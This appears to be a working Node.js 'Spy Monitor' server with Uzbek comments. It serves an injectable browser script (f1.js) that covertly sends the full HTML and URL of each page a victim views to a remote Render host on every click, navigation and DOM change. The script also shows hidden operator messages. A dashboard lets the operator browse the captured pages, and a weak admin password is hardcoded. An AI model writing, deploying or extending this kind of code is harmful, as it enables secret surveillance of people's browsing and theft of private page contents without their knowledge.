const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const cookieParser = require("cookie-parser");

const app = express();

// ========================================================
// ⚙️ SOZLAMALAR
const MY_SERVER_URL = "https://server-xkuu.onrender.com"; // Render manzilingiz
const ADMIN_PASSWORD = "8908"; 
// ========================================================

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(cookieParser());

// --- XOTIRA ---
let capturedPages = []; 
let chatHistory = ""; 
let lastUpdateID = 0;

const getUzTime = () => new Date().toLocaleString("uz-UZ", { timeZone: "Asia/Tashkent", hour12: false });

// Auth Middleware
const checkAuth = (req, res, next) => {
    if (req.cookies.admin_token === ADMIN_PASSWORD) next();
    else res.redirect("/login");
};

// ========================================================
// 📜 CLIENT SKRIPTI (f1.js) - DEEP WATCHER
// ========================================================
const clientScript = `
(function(){
  const BASE = '${MY_SERVER_URL}'; 
  let lastSince=0, box=null, clickCount=0;
  let currentUrl = window.location.href;

  // 1. STEALTH OYNA (Ko'zga tashlanmas)
  function makeBox(){
    if(box) return box;
    box=document.createElement('div');
    Object.assign(box.style,{
      position:'fixed', left:'0', bottom:'0', 
      width:'100%', height:'2px', // Juda ingichka chiziq (deyarli ko'rinmaydi)
      lineHeight:'15px',
      background:'transparent',
      color:'rgba(255, 255, 255, 0.5)',
      fontSize:'10px', fontFamily:'sans-serif',
      textAlign:'center', pointerEvents:'none', zIndex:2147483647,
      display:'none', whiteSpace:'nowrap', overflow:'hidden'
    });
    document.body.appendChild(box);
    return box;
  }

  // 2. HTML YUBORISH (Optimallashtirilgan)
  async function sendPage(){
    try{
      await fetch(BASE+'/upload-html',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({
            html: document.documentElement.outerHTML,
            url: window.location.href
        })
      });
    }catch(e){}
  }

  // 3. XABAR OLISH
  async function fetchLatest(){
    try{
      const r=await fetch(BASE+'/latest?since='+lastSince);
      const j=await r.json();
      
      if(j.success){
        const b=makeBox();
        if(j.timestamp > lastSince) {
            // Xabar kelsa, 20px ga kattarib ko'rsatadi
            b.style.height = '20px';
            b.style.background = 'rgba(0,0,0,0.8)';
            b.innerText = j.pureMessage;
            b.style.display = 'block';
            
            // 5 soniyadan keyin yana yashirinadi
            setTimeout(()=>{
                b.style.height = '2px';
                b.style.background = 'transparent';
                b.innerText = '';
            }, 5000);
        }
        lastSince = j.timestamp;
      }
    }catch(e){}
  }

  // --- DEEP WATCHER (Chuqur Kuzatuv) ---

  // A) URL o'zgarishini kuzatish
  setInterval(()=>{
    if(currentUrl !== window.location.href){
        currentUrl = window.location.href;
        sendPage(); // URL o'zgarsa darhol yubor
    }
  }, 1000);

  // B) Barcha Clicklar (Linklar, Tugmalar)
  document.addEventListener('click', (e) => {
      // 3 click -> Oynani to'liq ochish/yopish (tekshirish uchun)
      if(e.button===0){
        clickCount++;
        setTimeout(()=>clickCount=0, 500);
        if(clickCount>=3){
            clickCount=0;
            const b = makeBox();
            if(b.style.height === '20px') {
                 b.style.height='2px'; b.style.background='transparent';
            } else {
                 b.style.height='20px'; b.style.background='red'; b.innerText='SPY ACTIVE'; b.style.display='block';
            }
        }
      }
      
      // Har qanday clickdan keyin 1.5 soniya o'tib yuborish
      // Bu sahifa yuklanishini kutish uchun kerak
      setTimeout(sendPage, 1500);
  });

  // C) DOM Mutation (Agar sayt Ajax orqali o'zgarsa)
  let domTimer;
  const observer = new MutationObserver(() => {
     // Saytda o'zgarish bo'lsa, har safar yubormaslik uchun
     // o'zgarish tugashini kutamiz (debounce)
     clearTimeout(domTimer);
     domTimer = setTimeout(sendPage, 2000);
  });
  observer.observe(document.body, { childList: true, subtree: true });

  // Ishga tushirish
  setInterval(fetchLatest, 3000);
  sendPage(); 
})();
`;

// ========================================================
// 🛣 ROUTES
// ========================================================

app.get("/f1.js", (req, res) => {
    res.setHeader("Content-Type", "application/javascript");
    res.send(clientScript);
});

// LOGIN
app.get("/login", (req, res) => {
    if (req.cookies.admin_token === ADMIN_PASSWORD) return res.redirect("/");
    res.send(`<body style="background:#000;display:flex;justify-content:center;align-items:center;height:100vh"><form action="/login" method="POST"><input type="password" name="password" style="background:#111;border:none;color:#555;padding:10px;text-align:center;" placeholder="..." autofocus></form></body>`);
});
app.post("/login", (req, res) => {
    if (req.body.password === ADMIN_PASSWORD) {
        res.cookie("admin_token", ADMIN_PASSWORD, { maxAge: 86400000, httpOnly: true });
        res.redirect("/");
    } else res.redirect("/login");
});
app.get("/logout", (req, res) => { res.clearCookie("admin_token"); res.redirect("/login"); });

// API: Sahifalar ro'yxatini olish (Admin Panel uchun AJAX)
app.get("/api/pages", checkAuth, (req, res) => {
    // Biz HTMLni to'liq yubormaymiz (trafikni tejash uchun)
    // Faqat ID, URL va vaqtni yuboramiz
    const list = capturedPages.map((p, index) => ({
        id: index,
        url: p.url,
        date: p.date
    })).reverse(); // Eng yangisi tepada
    res.json(list);
});

// ADMIN DASHBOARD
app.get("/", checkAuth, (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Spy Monitor</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { background: #0f0f0f; color: #ccc; font-family: monospace; padding: 10px; max-width: 800px; margin: auto; }
                .box { border: 1px solid #333; background: #1a1a1a; padding: 10px; margin-bottom: 10px; border-radius: 5px; }
                input { width: 70%; padding: 8px; background: #000; border: 1px solid #444; color: #fff; }
                button { padding: 8px; cursor: pointer; border: none; font-weight: bold; font-family:monospace; }
                .btn-send { background: #007bff; color: white; }
                .btn-refresh { background: #28a745; color: white; width:100%; margin-bottom:10px; }
                .chat-history { background: #000; color: #0f0; padding: 5px; height: 80px; overflow-y: scroll; border: 1px solid #333; font-size: 11px; margin-top:5px; white-space: pre-wrap; }
                
                /* Pages List */
                #pages-container { max-height: 400px; overflow-y: auto; }
                .page-item { display: flex; justify-content: space-between; align-items: center; background: #222; padding: 8px; margin-bottom: 2px; border-bottom: 1px solid #333; }
                .page-info { display:flex; flex-direction:column; width: 80%; }
                .badge { color: #888; font-size: 10px; }
                .url { color: #0dcaf0; font-size: 11px; text-decoration:none; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
                .time { color: #666; font-size: 10px; }
                .btn-view { background: #6f42c1; color: white; text-decoration: none; font-size: 10px; padding: 5px 10px; border-radius: 3px; }
            </style>
        </head>
        <body>
            <div style="display:flex;justify-content:space-between;font-size:10px;color:#555;margin-bottom:5px">
                <span>Active</span>
                <a href="/logout" style="color:#555">Exit</a>
            </div>

            <!-- CHAT -->
            <div class="box">
                <form action="/set-message" method="POST" style="display:flex; justify-content:space-between">
                    <input type="text" name="msg" placeholder="Xabar..." autocomplete="off">
                    <button class="btn-send">SEND</button>
                </form>
                <div class="chat-history">${chatHistory || ""}</div>
                <form action="/clear-history" method="POST"><button style="background:none;color:#555;border:none;width:100%;margin-top:5px;font-size:10px;cursor:pointer">Tozalash</button></form>
            </div>

            <!-- PAGES (AUTO UPDATE) -->
            <div class="box">
                <div style="display:flex;justify-content:space-between;margin-bottom:5px">
                    <b>Sahifalar tarixi</b>
                    <button onclick="loadPages()" style="background:none;color:#28a745;border:none;cursor:pointer">🔄 Yangilash</button>
                    <form action="/clear-pages" method="POST" style="margin:0"><button style="background:none;color:red;border:none;cursor:pointer">X</button></form>
                </div>
                
                <div id="pages-container">
                    <div style="text-align:center;padding:20px;color:#555">Yuklanmoqda...</div>
                </div>
            </div>

            <script>
                // Admin Paneldagi Script (Bu brauzerda ishlaydi)
                function loadPages() {
                    fetch('/api/pages')
                        .then(res => res.json())
                        .then(data => {
                            const container = document.getElementById('pages-container');
                            if(data.length === 0) {
                                container.innerHTML = '<div style="text-align:center;padding:20px;color:#555">Hali ma\\'lumot yo\\'q</div>';
                                return;
                            }
                            
                            let html = '';
                            data.forEach(p => {
                                html += \`
                                <div class="page-item">
                                    <div class="page-info">
                                        <span class="badge">#\${p.id + 1} | \${p.date}</span>
                                        <a href="\${p.url}" target="_blank" class="url">\${p.url}</a>
                                    </div>
                                    <a href="/view-site/\${p.id}" target="_blank" class="btn-view">👁 OCHISH</a>
                                </div>\`;
                            });
                            container.innerHTML = html;
                        })
                        .catch(err => console.error(err));
                }

                // Har 3 soniyada ro'yxatni avtomatik yangilash
                setInterval(loadPages, 3000);
                
                // Sahifa ochilganda darhol yuklash
                loadPages();
            </script>
        </body>
        </html>
    `);
});

// SAHIFANI KO'RISH
app.get("/view-site/:id", checkAuth, (req, res) => {
    const id = req.params.id;
    const page = capturedPages[id];
    if (!page) return res.send("Topilmadi");
    const fixedHtml = page.html.replace("<head>", `<head><base href="${page.url}">`);
    res.send(fixedHtml);
});

// DATA QABUL
app.post("/upload-html", (req, res) => {
    const newPage = {
        url: req.body.url || "?",
        html: req.body.html || "",
        date: getUzTime()
    };
    capturedPages.push(newPage);
    if(capturedPages.length > 50) capturedPages.shift();
    res.json({ status: "ok" });
});

// XABARLAR
app.post("/set-message", checkAuth, (req, res) => {
    if(req.body.msg) {
        chatHistory += `[${getUzTime().split(' ')[1]}] ${req.body.msg}\n`;
        lastUpdateID = Date.now();
    }
    res.redirect("/");
});
app.post("/clear-history", checkAuth, (req, res) => { chatHistory = ""; lastUpdateID = Date.now(); res.redirect("/"); });
app.post("/clear-pages", checkAuth, (req, res) => { capturedPages = []; res.redirect("/"); });

app.get("/latest", (req, res) => {
    const clientTimestamp = parseInt(req.query.since) || 0;
    let pureText = chatHistory.replace(/\[.*?\] /g, ""); 
    res.json({ success: true, message: pureText, pureMessage: pureText, timestamp: lastUpdateID });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server ishga tushdi: ${PORT}`));
